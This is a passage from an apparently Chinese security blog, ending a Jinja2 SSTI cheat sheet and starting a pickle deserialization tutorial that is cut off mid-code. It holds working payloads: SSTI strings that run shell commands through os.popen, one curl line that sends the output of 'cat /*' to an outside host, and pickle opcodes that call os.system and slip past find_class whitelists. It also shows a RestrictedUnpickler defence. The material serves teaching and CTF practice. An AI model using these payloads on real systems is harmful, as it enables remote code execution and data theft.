class="hljs-string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">108</span>)%2<span class="hljs-string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">97</span>)%2<span class="hljs-string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">115</span>)%2<span class="hljs-string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">115</span>)%2<span class="hljs-string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">95</span>)%2<span class="hljs-string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">95</span>)]&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#使用print</span><br>&#123;%<span class="hljs-built_in">print</span>(lipsum.__globals__.__getitem__(\<span class="hljs-string">&quot;os\&quot;).popen(\&quot;base64 /f*\&quot;).read())%&#125;</span><br></code></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="内置类"><a href="#内置类" class="headerlink" title="内置类"></a>内置类</h2><ul><li><p>python内置类</p><p><code>__class__</code> 返回调用的参数类型<br><code>__bases__</code> 返回类型列表<br><code>__mro__</code> 此属性是在方法解析期间寻找基类时考虑的类元组<br><code>__subclasses__()</code> 返回object的子类<br><code>__globals__</code> 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价<br><code>__dict__</code> 返回类或对象对应的属性<br><code>__init__</code> 返回类或对象的构造方法<br><code>__builtins__</code> 该模块提供对python 的所有内置标识符的直接访问<br><code>__import__</code> 导入包函数<br><code>__getitem__</code> 对象或者字典获取属性（方法不可以）</p></li><li><p>jinja2内置类</p><p><code>config：flask.Flask.config（类文件导入了os）</code><br><code>request：flask.request</code><br><code>flask.request.referrer.args 伪造referer</code><br><code>flask.request.values.args 适用于post,get</code><br><code>flask.request.args.args 只适用于get 其中a是参数</code><br><code>flask.request.cookies.args</code><br><code>flask.request.headers.args</code><br><code>session：flask.session</code><br><code>g：flask</code></p></li><li><p>jinja2内置函数</p><p><code>url_for：flask.url_for</code></p><p><code>get_flashed_messages：flask.get_flashed_messages</code></p><p><code>lipsum</code></p></li></ul><h2 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h2><ol><li><p>字符转八进制</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py">strr = <span class="hljs-string">&quot;__init__&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;__init__&quot;</span>,<span class="hljs-string">&quot;__globals__&quot;</span>,<span class="hljs-string">&quot;__getitem__&quot;</span>,<span class="hljs-string">&quot;__builtins__&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://xxx?cmd=`cat /*`&#x27;).read()&quot;</span>]:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-comment">#print(str(oct(ord(a))))</span><br>        <span class="hljs-built_in">print</span>(i+<span class="hljs-string">&quot;:&quot;</span>)<br>        flag = flag + <span class="hljs-string">&#x27;\\&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(a)))[<span class="hljs-number">2</span>:]<br><br>    <span class="hljs-built_in">print</span>(flag)<br>    flag = <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><ul><li><a href="https://www.viewofthai.link/2023/01/06/python-ssti-%E6%80%BB%E7%BB%93/">python SSTI 总结 – View of Thai</a></li><li><a href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/">SecMap - SSTI（jinja2） - Tr0y’s Blog</a></li><li><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Python 沙箱逃逸的经验总结 - Tr0y’s Blog</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>python安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python安全</tag>
      
      <tag>模板注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickle反序列化</title>
    <link href="/2023/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><p>pickle是python中实现<strong>对象序列化与反序列化</strong>的模块，序列化后的数据格式为<strong>二进制字节流</strong>。</p></li><li><p>序列化后的二进制字节流由<strong>opcode</strong>所组成，通过编写opcode并使用pickle加载可以进行python<strong>代码执行</strong>与<strong>变量覆盖</strong>等操作。</p></li><li><p>pickle模块能够序列化的对象如下：</p><ul><li><code>None</code>、<code>True</code> 和 <code>False</code></li><li>整数、浮点数、复数</li><li><code>str</code>、<code>byte</code>、<code>bytearray</code></li><li>只包含可打包对象的集合，包括 tuple、list、set 和 dict</li><li>定义在模块顶层的函数（使用 <a href="https://docs.python.org/zh-cn/3.7/reference/compound_stmts.html#def"><code>def</code></a> 定义，<a href="https://docs.python.org/zh-cn/3.7/reference/expressions.html#lambda"><code>lambda</code></a> 函数则不可以）</li><li>定义在模块顶层的内置函数</li><li>定义在模块顶层的类</li><li>某些类实例，这些类的 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#object.__dict__"><code>__dict__</code></a> 属性值或 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#object.__getstate__"><code>__getstate__()</code></a> 函数的返回值可以被打包（详情参阅 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle-inst">打包类实例</a> 这一段）</li></ul></li><li><p>pickle常用API</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#将对象序列化并输出字节流</span><br>pickle.dumps(obj, protocol=<span class="hljs-literal">None</span>, *, fix_imports=<span class="hljs-literal">True</span>) -&gt; <span class="hljs-built_in">bytes</span><br><span class="hljs-comment">#将字节流反序列化为对象并返回</span><br>pickle.loads(data, *, fix_imports=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">&quot;ASCII&quot;</span>, errors=<span class="hljs-string">&quot;strict&quot;</span>) -&gt; <span class="hljs-built_in">object</span><br><br><span class="hljs-comment">#如果file参数被指定则将字节流写入文件file，file需要以wb格式打开。</span><br>pickle.dump(obj, file, protocol=<span class="hljs-literal">None</span>, *, fix_imports=<span class="hljs-literal">True</span>, buffer_callback=<span class="hljs-literal">None</span>)<br><span class="hljs-comment">#如果file参数被指定则从file中读取对象，file需要以rb格式打开。</span><br>pickle.load(file, *, fix_imports=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">&#x27;ASCII&#x27;</span>, errors=<span class="hljs-string">&#x27;strict&#x27;</span>, buffers=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure></li><li><p><code>__reduce__</code> ： object类的一个魔术方法，类在实例化时会触发，因此重写类的<code>__reduce__</code> 方法能控制类的实例化过程，这也是利用的重点。Python要求该方法返回一个字符串或者元组。如果返回元组<code>(callable, ([para1,para2...])[,...])</code> ，那么每当该类的对象被反序列化时，该<code>callable</code>就会被调用，参数为<code>para1、para2...</code></p></li></ul><h2 id="opcode与PVM"><a href="#opcode与PVM" class="headerlink" title="opcode与PVM"></a>opcode与PVM</h2><h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>pickle可以看作是一种独立的栈语言，它由一串串opcode(指令集)组成，opcode的解析由PVM(Pickle Virtual Machine)完成，PVM由三部分组成，分别是：</p><ul><li>stack：由list实现，用于临时存储数据、参数以及对象。</li><li>memo：由dict实现，为PVM整个生命周期提供存储。</li><li>指令处理器：读取识别opcode与参数，对其解释处理，直到终止符<code>.</code>结束，最后返回栈顶的值作为反序列化对象。</li></ul><p>pickle协议向前兼容，因此v0版本可以完全兼容<code>pickle.load()</code>目前共有五种协议的opcode，<strong>opcode释义、pickle版本、PVM解析实例见附录。</strong></p><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>利用opcode执行系统命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-comment"># c[moudle]\n[instance]\n 代表导入函数module.instance并压入stack</span><br><span class="hljs-comment"># (S&#x27;id&#x27; 代表向stack中压入一个MARK，同时声明一个字符串&#x27;id&#x27;并压入stack</span><br><span class="hljs-comment"># t代表寻找stack之中的MARK，并将其组合为数组，最后通过R执行os.system(&#x27;id&#x27;)</span><br><span class="hljs-comment"># . 代表结束</span><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;id&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>pickle.loads(opcode)<br>pickletools.dis(opcode) <span class="hljs-comment">#使用pickletools将opcode转化为易读的格式</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">uid=1000(spring) gid=0(root) groups=0(root)</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;os system&#x27;</span><br><span class="hljs-string">   11: (    MARK</span><br><span class="hljs-string">   12: S        STRING     &#x27;id&#x27;</span><br><span class="hljs-string">   18: t        TUPLE      (MARK at 11)</span><br><span class="hljs-string">   19: R    REDUCE</span><br><span class="hljs-string">   20: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h3><p>实例化对象的过程可以看作是调用构造函数的过程，因此通过opcode实例化对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.name = name<br>        self.age = age<br>        <span class="hljs-keyword">pass</span><br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">person</span><br><span class="hljs-string">(S&#x27;Alice&#x27;</span><br><span class="hljs-string">I18</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>person = pickle.loads(opcode)<br><span class="hljs-built_in">print</span>(person)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;__main__.person object at 0x7f3c99291520&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>重写<code>__reduce__</code>方法可以在反序列化时执行命令，但只能执行一次，使用opcode则可以执行多条指令，原因是opcode在没有出现<code>.</code>时不会停止加载，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tRcos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>在pickle中能够执行函数的字节码有三个分别是：<code>R, i, o</code>，他们的加载机制如下：</p><ul><li>R：直接将MARK与函数组合并执行。</li><li>i：相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）。</li><li>o：寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#R</span><br>opcode1=<span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#i</span><br>opcode2=<span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#o</span><br>opcode3=<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>在python编写的后端代码中，由于需要存储用户凭证经常需要session或cookie，它们一般存在于主函数模块或类中，如果是以明文存储的就存在变量覆盖的风险。</p><p>在pickle中，反序列化后的属性<code>key=value</code>是以字典的方式即<code>&#123;key:value&#125;</code>的方式存储的，因此我们在opcode中通过字节码<code>d</code>组合出字典<code>&#123;key:evil&#125;</code>，再使用字节码<code>b</code>执行<code>__dict__.update()</code>更新字典最终就可以覆盖属性<code>key</code>的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> secret<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret变量的值为:&quot;</span>+secret.secret) <span class="hljs-comment"># key123</span><br> <br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;secret&#x27;</span><br><span class="hljs-string">S&#x27;hack&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span> <br>fake=pickle.loads(opcode)<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret变量的值为:&quot;</span>+fake.secret) <span class="hljs-comment"># hack</span><br> <br></code></pre></td></tr></table></figure><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>对于pickle反序列化的防御有点类似于apache一开始对CC组件的java反序列化防御，都是重写类的加载过程，java中重写的是<code>ObjectInputStream.resolveClass()</code>，python中重写的是<code>Unpickler.find_class()</code>，为<code>module, name</code>设置白名单用于过滤用户对于恶意模块的获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> pickle<br> <br>safe_builtins = &#123;<br>    <span class="hljs-string">&#x27;range&#x27;</span>,<br>    <span class="hljs-string">&#x27;complex&#x27;</span>,<br>    <span class="hljs-string">&#x27;set&#x27;</span>,<br>    <span class="hljs-string">&#x27;frozenset&#x27;</span>,<br>    <span class="hljs-string">&#x27;slice&#x27;</span>,<br>&#125;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br> <br>    <span class="hljs-comment">#重写了find_class方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins: <br>            <span class="hljs-comment">#限制模块只能是builtins内置模块并且类名要处于白名单内</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br> <br>opcode=<span class="hljs-string">b&quot;cos\nsystem\n(S&#x27;echo hello world&#x27;\ntR.&quot;</span><br>restricted_loads(opcode)<br> <br> <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Traceback (most recent call last):</span><br><span class="hljs-string">...</span><br><span class="hljs-string">_pickle.UnpicklingError: global &#x27;os.system&#x27; is forbidden</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>想要绕过<code>find_class</code>，我们则需要了解其调用时机。在<a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#restricting-globals">官方文档</a>中描述如下</p><blockquote><p>出于这样的理由，你可能会希望通过定制 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.Unpickler.find_class"><code>Unpickler.find_class()</code></a> 来控制要解封的对象。 与其名称所提示的不同，**<a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.Unpickler.find_class"><code>Unpickler.find_class()</code></a> 会在执行对任何全局对象（例如一个类或一个函数）的请求时被调用**。 因此可以完全禁止全局对象或是将它们限制在一个安全的子集中。</p></blockquote><p>opcode中有三个字节码与全局对象有关：<code>c, i, \x93</code>。当opcode中存在这三个字节码时便会调用<code>Unpickler.find_class()</code>，因此我们在使用它们时不违反限制即可。</p><h3 id="绕过builtins"><a href="#绕过builtins" class="headerlink" title="绕过builtins"></a>绕过builtins</h3><h4 id="getattr"><a href="#getattr" class="headerlink" title="getattr"></a>getattr</h4><p>前面提到了<code>Unpickle</code>对于<code>builtins</code>模块的过滤如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br></code></pre></td></tr></table></figure><p><code>builtins</code>模块中包含了许多内置函数，在python中不需要import导入我们就可以使用这些内置函数，比如<code>int()</code>，<code>print()</code>。解释器在启动时自动导入了<code>builtins</code>模块，因此这些内置函数可以直接使用，使用代码<code>for i in sys.modules[&#39;builtins&#39;].__dict__:print(i,end=&#39;,&#39;)</code>来查看内置函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">import</span> sys<br>&gt;&gt;&gt;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.modules[<span class="hljs-string">&#x27;builtins&#x27;</span>].__dict__:<span class="hljs-built_in">print</span>(i,end = <span class="hljs-string">&#x27;,&#x27;</span>)<br><br>__name__,__doc__,__package__,__loader__,__spec__,__build_class__,<span class="hljs-built_in">__import__</span>,<span class="hljs-built_in">abs</span>,<span class="hljs-built_in">all</span>,<span class="hljs-built_in">any</span>,<span class="hljs-built_in">ascii</span>,<span class="hljs-built_in">bin</span>,<span class="hljs-built_in">breakpoint</span>,<span class="hljs-built_in">callable</span>,<span class="hljs-built_in">chr</span>,<span class="hljs-built_in">compile</span>,<span class="hljs-built_in">delattr</span>,<span class="hljs-built_in">dir</span>,<span class="hljs-built_in">divmod</span>,<span class="hljs-built_in">eval</span>,<span class="hljs-built_in">exec</span>,<span class="hljs-built_in">format</span>,<span class="hljs-built_in">getattr</span>,<span class="hljs-built_in">globals</span>,<span class="hljs-built_in">hasattr</span>,<span class="hljs-built_in">hash</span>,<span class="hljs-built_in">hex</span>,<span class="hljs-built_in">id</span>,<span class="hljs-built_in">input</span>,<span class="hljs-built_in">isinstance</span>,<span class="hljs-built_in">issubclass</span>,<span class="hljs-built_in">iter</span>,<span class="hljs-built_in">len</span> .....<br></code></pre></td></tr></table></figure><p>如果指定了模块为&#96;builtins，同时设置了函数黑名单，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist=&#123;<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>,<span class="hljs-string">&#x27;__import__&#x27;</span>,<span class="hljs-string">&#x27;exit&#x27;</span>,<span class="hljs-string">&#x27;input&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>我们可以借用<code>getattr()</code>来获取我们需要的函数模块，如果直接使用<code>&#39;&#39;&#39;cbuiltins\ngetattr&#39;&#39;&#39;</code>将模块压入stack会报错，原因在于同时把对象和字符串压入，因此要使用<code>builtins.globals().get(&#39;builtins&#39;)</code>来获取模块。改成opcode就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle,builtins<br><br>payload=<span class="hljs-string">b&quot;&quot;&quot;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">(tRS&#x27;builtins&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>a=pickle.loads(payload)<br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><p>最后就可以获取<code>eval</code>执行命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = <span class="hljs-string">b&quot;&quot;&quot;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">(tRS&#x27;builtins&#x27;</span><br><span class="hljs-string">tRS&#x27;eval&#x27;</span><br><span class="hljs-string">tRp1</span><br><span class="hljs-string">(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">tR.&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="getattr-o"><a href="#getattr-o" class="headerlink" title="getattr+o"></a>getattr+o</h4><p><code>R</code>被过滤时也可以使用<code>o</code>平替：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = <span class="hljs-string">b&#x27;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;whoami&quot;)o.&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="v3版本套娃pickle"><a href="#v3版本套娃pickle" class="headerlink" title="v3版本套娃pickle"></a>v3版本套娃pickle</h4><p>思路是利用内置函数载入pickle，使用<code>pickle.loads()</code>来绕过<code>find_class()</code>，有点像java的二次反序列化绕过，但是<code>pickle.loads()</code>需要参数为bytes类型，v0版本不支持直接传入bytes类型，并且encode()函数也无法导入，直到v3版本引入了<code>B</code>和<code>C</code>字节码处理bytes类型。</p><p>依然先使用<code>getattr()</code>绕过对于<code>builtins</code>的过滤获取<code>get()</code>以拿到<code>pickle</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> pickletools<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Op</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">getattr</span>,(builtins.<span class="hljs-built_in">dict</span>,<span class="hljs-string">&#x27;get&#x27;</span>,))<br> <br>op=Op()<br>opcode=pickle.dumps(op,protocol=<span 